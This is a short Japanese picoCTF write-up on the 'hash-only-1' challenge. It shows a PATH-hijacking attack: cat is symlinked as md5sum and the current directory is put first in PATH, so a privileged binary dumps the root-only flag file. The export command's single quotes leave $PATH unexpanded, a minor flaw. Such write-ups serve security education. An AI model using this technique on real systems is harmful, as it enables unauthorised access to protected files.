---
title: "picoCTF hash-only-1 writeup"
tag: ["expliot"]
---

# hash-only-1

## / Overview

間違った`md5sum`を実行させる。

## / Writeup

ホームディレクトリの`flaghasher`は`/root/flag`の内容をハッシュ化して出力します。ユーザーに`/root`ディレクトリへのアクセス権はないので、この`flaghasher`をうまく使います。

```sh
$ cat ./flaghasher

...(省略)... /bin/bash -c 'md5sum /root/flag.txt' ...(省略)...
```

内部で`md5sum`を使ってハッシュ化されているので、このコマンドの参照先を`/usr/bin/cat`に書き換えます。具体的には

```sh
# ./md5sum に cat をリンクする。
$ ln -s /usr/bin/cat ./md5sum
# PATHの先頭に.(カレントディレクトリ)を追加
$ export PATH='.:$PATH'
```

とします。こうすることでカレントディレクトリのコマンドが優先されるので、`md5sum`は`cat`を実行するようになります。
